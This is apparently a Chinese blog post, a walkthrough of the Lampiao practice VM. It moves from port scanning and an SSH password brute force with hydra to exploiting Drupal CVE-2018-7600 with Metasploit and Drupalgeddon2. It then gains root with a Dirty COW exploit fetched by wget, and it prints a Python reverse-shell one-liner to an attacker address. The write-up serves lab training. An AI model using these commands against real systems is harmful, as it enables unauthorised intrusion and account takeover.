@@ -1,0 +1,215 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Lampiao | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1、nmap 10.211.55.9 -p-目标计算机上有三个可用的开放端口22、80、1898端口 2、信息枚举：http:&#x2F;&#x2F;10.211.55.9:1898&#x2F; -&gt; Read more 发现改页面信息：http:&#x2F;&#x2F;10.211.55.9:1898&#x2F;?q&#x3D;node&#x2F;2页面发现：audio.m4a：语音获得用户名：tiagoqrc.png：图片二维码扫描获得信息，需要爆破 3、爆破下网站">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lampiao">
+<meta property="og:url" content="https://chr1sto4f.github.io/2023/01/26/Lampiao/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="1、nmap 10.211.55.9 -p-目标计算机上有三个可用的开放端口22、80、1898端口 2、信息枚举：http:&#x2F;&#x2F;10.211.55.9:1898&#x2F; -&gt; Read more 发现改页面信息：http:&#x2F;&#x2F;10.211.55.9:1898&#x2F;?q&#x3D;node&#x2F;2页面发现：audio.m4a：语音获得用户名：tiagoqrc.png：图片二维码扫描获得信息，需要爆破 3、爆破下网站">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg">
+<meta property="article:published_time" content="2023-01-26T09:29:40.000Z">
+<meta property="article:modified_time" content="2023-01-26T09:35:23.523Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2023/01/26/Lampiao/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Lampiao',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-01-26 17:35:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Lampiao</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-26T09:29:40.000Z" title="发表于 2023-01-26 17:29:40">2023-01-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-26T09:35:23.523Z" title="更新于 2023-01-26 17:35:23">2023-01-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Lampiao"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="1、nmap-10-211-55-9-p"><a href="#1、nmap-10-211-55-9-p" class="headerlink" title="1、nmap 10.211.55.9 -p-"></a>1、nmap 10.211.55.9 -p-</h3><p>目标计算机上有三个可用的开放端口22、80、1898端口</p>
+<h3 id="2、信息枚举：http-10-211-55-9-1898-gt-Read-more-发现改页面信息："><a href="#2、信息枚举：http-10-211-55-9-1898-gt-Read-more-发现改页面信息：" class="headerlink" title="2、信息枚举：http://10.211.55.9:1898/ -&gt; Read more 发现改页面信息："></a>2、信息枚举：<a target="_blank" rel="noopener" href="http://10.211.55.9:1898/">http://10.211.55.9:1898/</a> -&gt; Read more 发现改页面信息：</h3><p><a target="_blank" rel="noopener" href="http://10.211.55.9:1898/?q=node/2">http://10.211.55.9:1898/?q=node/2</a><br>页面发现：<br>audio.m4a：语音获得用户名：tiago<br>qrc.png：图片二维码扫描获得信息，需要爆破</p>
+<h3 id="3、爆破下网站目录"><a href="#3、爆破下网站目录" class="headerlink" title="3、爆破下网站目录"></a>3、爆破下网站目录</h3><p>dirb <a target="_blank" rel="noopener" href="http://10.211.55.9:1898/">http://10.211.55.9:1898</a><br>获得url：<a target="_blank" rel="noopener" href="http://10.211.55.9:1898/robots.txt">http://10.211.55.9:1898/robots.txt</a><br>继续枚举获得：<a target="_blank" rel="noopener" href="http://10.211.55.9:1898/CHANGELOG.txt">http://10.211.55.9:1898/CHANGELOG.txt</a><br>发现是：Drupal 7.54, 2017-02-01</p>
+<h3 id="4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典"><a href="#4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典" class="headerlink" title="4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典"></a>4、获取密码字典：cewl：通过爬行网站获取关键信息创建一个密码字典</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl http://10.211.55.9:1898/?q=node/1 -w ff.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5、hydra爆破"><a href="#5、hydra爆破" class="headerlink" title="5、hydra爆破"></a>5、hydra爆破</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l tiago -P ff.txt 10.211.55.9 ssh</span><br></pre></td></tr></table></figure>
+
+<p>先利用cewl来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索cewl学习，然后九头蛇暴力破解得到用户密码：</p>
+<p>[22][ssh] host: 10.211.55.9   login: tiago   password: Virgulino</p>
+<p><strong>用户: tiago</strong><br><strong>密码: Virgulino</strong></p>
+<h3 id="6、登录ssh"><a href="#6、登录ssh" class="headerlink" title="6、登录ssh"></a>6、登录ssh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tiago@10.211.55.9</span><br></pre></td></tr></table></figure>
+
+<p>发现是低权限用户！需要提权！</p>
+<h3 id="7、提权"><a href="#7、提权" class="headerlink" title="7、提权"></a>7、提权</h3><p>谷歌搜索：Drupal 7.54 exploit<br>#1063256 [CVE-2018-7600] Remote Code Execution due to …</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search  Drupal</span><br><span class="line"><span class="built_in">set</span> rport 1898</span><br><span class="line"><span class="built_in">set</span> rhosts 10.211.55.9</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功通过漏洞渗透进入系统，获得低权限用户，和前面ssh登陆的tiago用户权限类似，这是另外一种渗透的方法，可以好好学习。<br>下一步要找到反弹shell获取root权限，通过网上对Durpal 7版本2016年都可以使用dirty（脏牛）进行提权，非常有名的一个漏洞提权目前已经修复，仅供参考学习。</p>
+<h3 id="8、提权2"><a href="#8、提权2" class="headerlink" title="8、提权2"></a>8、提权2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty</span><br></pre></td></tr></table></figure>
+
+<p>使用：Linux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW &#x2F;proc&#x2F;self&#x2F;mem’ Race Condition Privile | linux&#x2F;local&#x2F;40847.cpp</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;root&#x2F;桌面&#x2F;<br>继续开启本地pthon服务，然后把40847.cp发送到靶机上：<br>python -m SimpleHTTPServer 8081</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.211.55.28:8081/40847.cpp</span><br></pre></td></tr></table></figure>
+
+<p>命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o ff 40847.cpp -lutil</span><br></pre></td></tr></table></figure>
+
+<p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告<br>-pedantic 允许发出ANSI&#x2F;ISO C标准所列出的所有警告<br>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高<br>-std&#x3D;c++11就是用按C++2011标准来编译的<br>-pthread 在Linux中要用到多线程时，需要链接pthread库<br>-o dcow gcc生成的目标文件,名字为dcow<br>执行gcc编译可执行文件，可直接提权。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./40847</span><br></pre></td></tr></table></figure>
+
+<p>Root password is:   dirtyCowFun<br>获得root用户密码！</p>
+<h3 id="9、登录root-ssh"><a href="#9、登录root-ssh" class="headerlink" title="9、登录root-ssh"></a>9、登录root-ssh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.211.55.9</span><br><span class="line">root@lampiao:~<span class="comment"># cat /root/flag.txt </span></span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>拓展思路：<br>1、通过AWVS+xray跑出了poc：poc-yaml-drupal-cve-2018-7600-rce<br>那么Xray是给出了两篇poc的文章：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a></p>
+<p>通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载！<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/dreadlocked/Drupalgeddon2.git</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install highline     --安装模块</span><br></pre></td></tr></table></figure>
+
+<p>安装完highline后即可执行：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./drupalgeddon2.rb http://10.211.55.9:1898/</span><br></pre></td></tr></table></figure>
+
+<p>通过poc发现对方是7.x的drupal版本漏洞，通过base64方法上传shell.php成功获得shell！</p>
+<p>然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.28&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 6666</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.211.55.28:8081/40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br><span class="line">./40847</span><br></pre></td></tr></table></figure>
+
+
+<p>获得root用户密码！</p>
+<p>登录root-ssh：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.211.55.9</span><br><span class="line">root@lampiao:~<span class="comment"># cat /root/flag.txt </span></span><br><span class="line"></span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>通过AWVS+xray跑出了poc：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a><br>通过文章查看，Drupalgeddon2有poc都是rb运行文件，下载：<br><a target="_blank" rel="noopener" href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/dreadlocked/Drupalgeddon2.git</span><br><span class="line"></span><br><span class="line">sudo gem install highline</span><br><span class="line">./drupalgeddon2.rb http://10.211.55.9:1898/</span><br></pre></td></tr></table></figure>
+
+<p>然后该shell是无法执行g++命令的，我将python进行反弹shell到本地nc交互：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.211.55.28&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 6666</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://10.211.55.28:8081/40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil</span><br><span class="line">./40847</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io">0000FF</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://chr1sto4f.github.io/2023/01/26/Lampiao/">https://chr1sto4f.github.io/2023/01/26/Lampiao/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://chr1sto4f.github.io" target="_blank">0000FF's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a></div><div class="post_share"><div class="social-share" data-image="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/c8f5624d123daea9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/26/Raven-2/"><img class="prev-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Raven-2</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/26/GoldenEye/"><img class="next-cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GoldenEye</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">DerpNStink-1</div></div></a></div><div><a href="/2023/01/26/GoldenEye/" title="GoldenEye"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">GoldenEye</div></div></a></div><div><a href="/2023/01/26/Raven-2/" title="Raven-2"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/20220430025304_38833.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Raven-2</div></div></a></div><div><a href="/2021/02/05/SQLi%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%B8%B8%E7%94%A8%E5%A4%87%E5%BF%98%E5%8D%95/" title="SQLi认证绕过常用备忘单"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a75b2c4dc8eacda7664ec01cb5da76fd.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-05</div><div class="title">SQLi认证绕过常用备忘单</div></div></a></div><div><a href="/2023/01/26/Tr0ll-1/" title="Tr0ll-1"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/1627789557_462143.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">Tr0ll-1</div></div></a></div><div><a href="/2022/02/11/Ubuntu%E4%B8%8B%E9%85%8D%E7%BD%AEmsf%E5%B9%B6%E7%94%9F%E6%88%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%AC/" title="Ubuntu下配置msf并生成安卓木马"><img class="cover" src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.a4385dd85202d7ff20f912bb5c675214.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-11</div><div class="title">Ubuntu下配置msf并生成安卓木马</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0000FF</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Chr1sTo4F"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Chr1sTo4F" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:Chr1sTo4F@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">考研一战成硕</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hvv面经"/></a><div class="content"><a class="title" href="/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/" title="hvv面经">hvv面经</a><time datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DerpNStink-1"/></a><div class="content"><a class="title" href="/2023/02/04/DerpNStink-1/" title="DerpNStink-1">DerpNStink-1</a><time datetime="2023-02-04T06:47:32.000Z" title="发表于 2023-02-04 14:47:32">2023-02-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/R-C.ebb9668b3a30bc070e108ec0341097bd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权漏洞合集and域渗透历史漏洞整理"/></a><div class="content"><a class="title" href="/2023/01/30/Windows%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86and%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title="Windows提权漏洞合集and域渗透历史漏洞整理">Windows提权漏洞合集and域渗透历史漏洞整理</a><time datetime="2023-01-30T04:27:55.000Z" title="发表于 2023-01-30 12:27:55">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/t01db9bc29a66401694.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="微信小程序信息收集"/></a><div class="content"><a class="title" href="/2023/01/27/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="微信小程序信息收集">微信小程序信息收集</a><time datetime="2023-01-27T06:06:28.000Z" title="发表于 2023-01-27 14:06:28">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/9e759a9e6d036079ae79df3d8c914976.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lord Of The Root-1.0.1"/></a><div class="content"><a class="title" 